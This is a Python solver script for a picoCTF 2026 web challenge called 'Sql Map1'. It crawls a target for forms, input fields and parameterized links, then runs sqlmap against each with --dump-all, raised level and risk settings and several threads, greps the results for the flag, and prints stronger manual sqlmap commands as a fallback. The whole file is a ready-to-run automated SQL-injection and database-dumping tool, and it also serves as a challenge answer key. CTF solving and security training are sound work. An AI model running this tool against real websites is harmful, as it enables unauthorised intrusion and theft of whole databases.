#!/usr/bin/env python3
"""
Sql Map1 - picoCTF 2026
Category: Web Exploitation | Points: 300

Automated solver that uses sqlmap to exploit SQL injection and extract the flag.

Usage:
    python3 solve.py <challenge-url>

Example:
    python3 solve.py http://saturn.picoctf.net:12345

Requirements:
    - sqlmap must be installed (pip install sqlmap  OR  apt install sqlmap)
    - requests (pip install requests)
"""

import argparse
import os
import re
import subprocess
import sys
import tempfile

try:
    import requests
except ImportError:
    print("[!] 'requests' module not found. Install with: pip install requests")
    sys.exit(1)


def find_sqlmap():
    """Locate sqlmap binary."""
    # Check common locations
    for cmd in ["sqlmap", "python3 -m sqlmap", "python -m sqlmap"]:
        try:
            result = subprocess.run(
                cmd.split() + ["--version"],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0:
                return cmd.split()
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue

    # Check if sqlmap.py exists in common paths
    common_paths = [
        "/usr/share/sqlmap/sqlmap.py",
        "/usr/local/bin/sqlmap",
        os.path.expanduser("~/sqlmap-dev/sqlmap.py"),
        os.path.expanduser("~/tools/sqlmap/sqlmap.py"),
    ]
    for path in common_paths:
        if os.path.isfile(path):
            return ["python3", path]

    return None


def discover_endpoints(base_url):
    """Try to discover injectable endpoints on the target."""
    session = requests.Session()
    endpoints = []

    # Try common paths
    paths_to_try = [
        "/", "/login", "/search", "/index.php", "/index.html",
        "/api/search", "/api/login", "/query", "/lookup",
    ]

    print(f"[*] Probing {base_url} for endpoints...")

    for path in paths_to_try:
        try:
            url = base_url.rstrip("/") + path
            resp = session.get(url, timeout=10, allow_redirects=True)
            if resp.status_code == 200:
                # Check for forms in the HTML
                forms = re.findall(
                    r'<form[^>]*action=["\']([^"\']*)["\'][^>]*method=["\']([^"\']*)["\']',
                    resp.text, re.IGNORECASE
                )
                if forms:
                    for action, method in forms:
                        if not action.startswith("http"):
                            action = base_url.rstrip("/") + "/" + action.lstrip("/")
                        endpoints.append((action, method.upper()))
                        print(f"    [+] Found form: {method.upper()} {action}")

                # Check for input fields
                inputs = re.findall(
                    r'<input[^>]*name=["\']([^"\']*)["\']', resp.text, re.IGNORECASE
                )
                if inputs and not forms:
                    endpoints.append((url, "GET"))
                    print(f"    [+] Found inputs at: {url} -> {inputs}")

                # Also check for query parameters in links
                param_links = re.findall(r'href=["\']([^"\']*\?[^"\']*)["\']', resp.text)
                for link in param_links:
                    if not link.startswith("http"):
                        link = base_url.rstrip("/") + "/" + link.lstrip("/")
                    endpoints.append((link, "GET"))
                    print(f"    [+] Found parameterized link: {link}")

        except requests.RequestException:
            continue

    # Also store session cookies for sqlmap
    cookies = session.cookies.get_dict()
    cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items()) if cookies else None

    return endpoints, cookie_str


def run_sqlmap(target_url, method="GET", data=None, cookie=None):
    """Run sqlmap and capture output."""
    sqlmap_cmd = find_sqlmap()
    if not sqlmap_cmd:
        print("[!] sqlmap not found! Please install it:")
        print("    pip install sqlmap")
        print("    OR: apt install sqlmap")
        print("    OR: git clone https://github.com/sqlmapproject/sqlmap.git")
        sys.exit(1)

    # Create temp directory for sqlmap output
    output_dir = tempfile.mkdtemp(prefix="sqlmap_picoctf_")

    cmd = sqlmap_cmd + [
        "-u", target_url,
        "--batch",           # Non-interactive
        "--dump-all",        # Dump everything
        "--level", "3",      # Increase detection level
        "--risk", "2",       # Moderate risk
        "--threads", "4",    # Speed up
        "--output-dir", output_dir,
        "--flush-session",   # Fresh start
    ]

    if method == "POST" and data:
        cmd.extend(["--data", data])

    if cookie:
        cmd.extend(["--cookie", cookie])

    # If the URL doesn't have parameters, try --forms
    if "?" not in target_url and method == "GET" and not data:
        cmd.append("--forms")

    print(f"\n[*] Running sqlmap...")
    print(f"    Command: {' '.join(cmd)}\n")

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=300  # 5 minute timeout
        )
        output = result.stdout + "\n" + result.stderr
    except subprocess.TimeoutExpired:
        print("[!] sqlmap timed out after 5 minutes")
        output = ""

    return output, output_dir


def extract_flag(text):
    """Search text for picoCTF flag pattern."""
    flags = re.findall(r'picoCTF\{[^}]+\}', text)
    return flags


def search_sqlmap_output(output_dir):
    """Search sqlmap output files for the flag."""
    flags = []
    for root, dirs, files in os.walk(output_dir):
        for fname in files:
            fpath = os.path.join(root, fname)
            try:
                with open(fpath, "r", errors="ignore") as f:
                    content = f.read()
                    found = extract_flag(content)
                    if found:
                        flags.extend(found)
            except Exception:
                continue
    return flags


def main():
    parser = argparse.ArgumentParser(
        description="Sql Map1 solver - picoCTF 2026"
    )
    parser.add_argument(
        "url",
        help="Challenge URL (e.g., http://saturn.picoctf.net:12345)"
    )
    parser.add_argument(
        "--data",
        help="POST data (e.g., 'username=admin&password=pass')",
        default=None
    )
    parser.add_argument(
        "--cookie",
        help="Session cookie string",
        default=None
    )
    parser.add_argument(
        "--param",
        help="Specific parameter to test (e.g., 'username')",
        default=None
    )
    args = parser.parse_args()

    base_url = args.url.rstrip("/")
    print(f"[*] Sql Map1 Solver - picoCTF 2026")
    print(f"[*] Target: {base_url}\n")

    # Phase 1: Discover endpoints
    endpoints, auto_cookie = discover_endpoints(base_url)
    cookie = args.cookie or auto_cookie

    # Phase 2: Run sqlmap
    if args.data:
        # User specified POST data
        print(f"[*] Using provided POST data: {args.data}")
        output, output_dir = run_sqlmap(base_url, "POST", args.data, cookie)
    elif endpoints:
        # Try discovered endpoints
        for url, method in endpoints:
            print(f"[*] Trying: {method} {url}")
            data = None
            if method == "POST":
                # Build dummy POST data from form inputs
                try:
                    resp = requests.get(url, timeout=10)
                    inputs = re.findall(
                        r'<input[^>]*name=["\']([^"\']*)["\']',
                        resp.text, re.IGNORECASE
                    )
                    data = "&".join(f"{inp}=test" for inp in inputs)
                except Exception:
                    data = "username=test&password=test"

            output, output_dir = run_sqlmap(url, method, data, cookie)

            # Check for flag in sqlmap output
            flags = extract_flag(output)
            if not flags:
                flags = search_sqlmap_output(output_dir)

            if flags:
                print(f"\n{'='*60}")
                print(f"[+] FLAG FOUND: {flags[0]}")
                print(f"{'='*60}\n")
                return

            print(f"[-] No flag found with this endpoint, trying next...\n")
    else:
        # Fallback: run sqlmap with --forms on the base URL
        print("[*] No specific endpoints found, using --forms mode")
        output, output_dir = run_sqlmap(base_url, "GET", cookie=cookie)

    # Final flag search
    all_flags = extract_flag(output) if 'output' in dir() else []
    if not all_flags and 'output_dir' in dir():
        all_flags = search_sqlmap_output(output_dir)

    if all_flags:
        print(f"\n{'='*60}")
        print(f"[+] FLAG FOUND: {all_flags[0]}")
        print(f"{'='*60}\n")
    else:
        print("\n[-] Flag not found automatically.")
        print("[*] Try running sqlmap manually with more specific parameters:")
        print(f"    sqlmap -u \"{base_url}\" --forms --batch --dump-all --level 5 --risk 3")
        print(f"\n[*] Or target a specific parameter:")
        print(f"    sqlmap -u \"{base_url}/endpoint?param=test\" --batch --dump-all")
        if 'output_dir' in dir():
            print(f"\n[*] sqlmap output saved to: {output_dir}")


if __name__ == "__main__":
    main()
